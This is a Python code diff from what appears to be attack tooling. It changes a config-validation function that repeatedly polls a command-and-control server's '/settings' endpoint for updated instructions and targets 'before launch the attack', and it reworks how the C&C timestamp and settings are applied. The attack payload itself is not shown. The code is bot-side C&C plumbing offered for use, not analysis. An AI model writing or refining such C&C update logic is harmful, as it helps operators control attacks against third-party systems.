@@ -55,18 +55,43 @@ def validateConfigFile(config_file, override, ccserver=None):
     @param ccserver, string - default None, C&C server remote address
     @return configuration, dictionary or None if error occurs
     """
-
-    # retrieving configuration file
+    
     configuration = {}
-    try:
-        with open(config_file) as configJSON:
-            configuration = json.load(configJSON)
-            configJSON.close()
-        # if configuration file does not exist... we return None.
-    except (FileNotFoundError, IOError, ValueError) as error:
-        return None
 
-    # 0. compare root schema 
+    if len(config_file) != 0:
+        # 0. retrieving configuration file
+        try:
+            with open(config_file) as configJSON:
+                configuration = json.load(configJSON)
+                configJSON.close()
+            # if configuration file does not exist... we return None.
+        except (FileNotFoundError, IOError, ValueError) as error:
+            return None
+    
+    # 0. check for updates connecting to C&C (if not override option is enabled)
+    if (not override):
+        # check for ccserver address 
+        ccserveraddr = ccserver
+        if ('cc_server' in configuration) and (ccserver is None):
+            ccserveraddr = configuration['cc_server'] if (len(configuration['cc_server']) > 0) else None
+        # waiting for update before launch the attack
+        if ccserveraddr:
+            while True:
+                last_modified = int(configuration['last_modified']) if 'last_modified' in configuration else 0
+                cc_config, updated = validateCCUpdate(ccserveraddr, rootSchema, last_modified)
+                # check for remote connection success and update local configuration
+                if updated:
+                    configuration = cc_config
+                    if len(config_file) != 0:
+                        if not updateConfigFile(config_file, configuration):
+                            return None
+                    break
+        else:
+            return None
+
+    
+
+    # 1. compare root schema 
     if configuration.keys() != rootSchema.keys():
         return None
     # set to default
@@ -74,26 +99,6 @@ def validateConfigFile(config_file, override, ccserver=None):
         if len(configuration[setting]) == 0:
             configuration[setting] = rootSchema[setting]
 
-    # 1. check for updates connecting to C&C (if not override option is enabled)
-    if (not override):
-        # check for ccserver address 
-        ccserveraddr = ccserver
-        if (len(configuration['cc_server']) != 0) and (ccserver is None):
-            ccserveraddr = configuration['cc_server']
-        # waiting for update before launch the attack
-        if ccserveraddr:
-            while True:
-                cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, int(configuration['last_modified']))
-                # check for remote connection success and update local configuration
-                if updated:
-                    configuration = cc_config
-                    if not updateConfigFile(config_file, configuration):
-                        return None
-                    break
-        else:
-            return None
-
-            
     
     # 2. compare target schema
     targetList = configuration['targets']
@@ -175,15 +180,9 @@ def validateCCUpdate(server, schema, last_modified):
         cc_config = requests.get(server + '/settings').json()
         # check for updated instructions
         # C&C update has priority only if it is more recent
-        if cc_config['timestamp'] >= last_modified:
-            if not cc_config['enable']: 
-                # configuration reset
-                configuration = schema
-                return configuration, True
-            else:
-                # configuration update
-                configuration = cc_config['settings']
-                return configuration, True
+        if cc_config['last_modified'] >= last_modified:
+            configuration = cc_config
+            return configuration, True
         else:
             return configuration, False
 
